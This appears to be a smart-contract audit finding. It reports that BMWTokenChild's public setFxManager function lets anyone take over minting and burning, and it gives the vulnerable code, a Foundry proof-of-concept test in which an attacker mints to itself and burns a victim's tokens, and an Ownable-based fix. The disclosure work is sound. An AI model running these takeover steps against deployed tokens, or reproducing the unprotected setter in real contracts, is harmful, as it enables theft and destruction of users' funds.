[H-01] Public `setFxManager` in `BMWTokenChild `Enables Unauthorized Control Over Minting and Burning


Summary

The setFxManager function in BMWTokenChild is public, allowing any user to change the _fxManager address. As _fxManager controls minting and burning, an attacker can seize control, mint unlimited tokens, and burn users’ balances, potentially destroying the token economy.

See bug on line 24:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract BMWTokenChild is ERC20 {
    address internal _fxManager;

    constructor(address fxManager) ERC20("BeemerToken", "BMW") {
        _fxManager = fxManager;
    }

    function setFxManager(address fxManager) public {
        _fxManager = fxManager;
    }

    function mint(address user, uint256 amount) public {
        require(msg.sender == _fxManager, "Invalid sender");
        _mint(user, amount);
    }

    function burn(address user, uint256 amount) public {
        require(msg.sender == _fxManager, "Invalid sender");
        _burn(user, amount);
    }
}
```

Vulnerability Details

The setFxManager function is defined as:

```solidity
function setFxManager(address fxManager) public {
    _fxManager = fxManager;
}
```
This function updates `_fxManager` without restrictions. The `mint` and burn functions require `msg.sender == _fxManager`:

```solidity
function mint(address user, uint256 amount) public {
    require(msg.sender == _fxManager, "Invalid sender");
    _mint(user, amount);
}
function burn(address user, uint256 amount) public {
    require(msg.sender == _fxManager, "Invalid sender");
    _burn(user, amount);
}
```

By calling `setFxManager(attackerAddress)`, an attacker becomes `_fxManager` and can mint or burn tokens at will.

Root Cause: The public visibility of `setFxManager` lacks access control, enabling unauthorized changes to `_fxManager`.

Impact

.Unlimited Minting: Attackers can mint tokens to themselves, inflating the supply and devaluing the token.

.Unauthorized Burning: Attackers can burn any user’s tokens, effectively stealing or destroying assets.

.Economic Collapse: Complete control over the token supply undermines the protocol’s integrity, leading to loss of trust and funds.

.Severity: High, due to catastrophic financial and systemic consequences.

Proof of Concept (PoC)

The following Foundry test demonstrates the exploit:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/dev/BMWTokenChild.sol";

contract BMWTokenChildTest is Test {
    BMWTokenChild token;
    address initialFxManager = address(0x1);
    address attacker = address(0x2);
    address victim = address(0x3);

    function setUp() public {
        token = new BMWTokenChild(initialFxManager);
        vm.prank(initialFxManager);
        token.mint(victim, 1000 * 1e18); // Mint tokens to victim
    }

    function testTakeoverFxManager() public {
        vm.prank(attacker);
        token.setFxManager(attacker); // Attacker sets themselves as _fxManager
        vm.prank(attacker);
        token.mint(attacker, 1e18); // Attacker mints tokens
        assertEq(token.balanceOf(attacker), 1e18, "Attacker should have tokens");
        uint256 victimBalance = token.balanceOf(victim);
        vm.prank(attacker);
        token.burn(victim, victimBalance); // Attacker burns victim's tokens
        assertEq(token.balanceOf(victim), 0, "Victim's tokens should be burned");
    }
}
```

Execution: Run `forge test --match-path test/BMWTokenChildTest.sol --via -ir`. The test shows an attacker taking control and manipulating the token supply.

Recommended Mitigation

Restrict `setFxManager` to the contract owner by inheriting `Ownable` and adding validation:

```solidity
contract BMWTokenChild is ERC20, Ownable {
    constructor(address fxManager, address initialOwner) ERC20("BeemerToken", "BMW") Ownable(initialOwner) {
        require(fxManager != address(0), "Invalid fxManager");
        _fxManager = fxManager;
    }
    function setFxManager(address fxManager) public onlyOwner {
        require(fxManager != address(0), "Invalid fxManager");
        _fxManager = fxManager;
    }
}
```

Tools Used
Manual code review
Foundry (for PoC development)
VS Code with markdownlint and Solidity extensions

References

OpenZeppelin Ownable(https://docs.openzeppelin.com/contracts/2.x/access-control)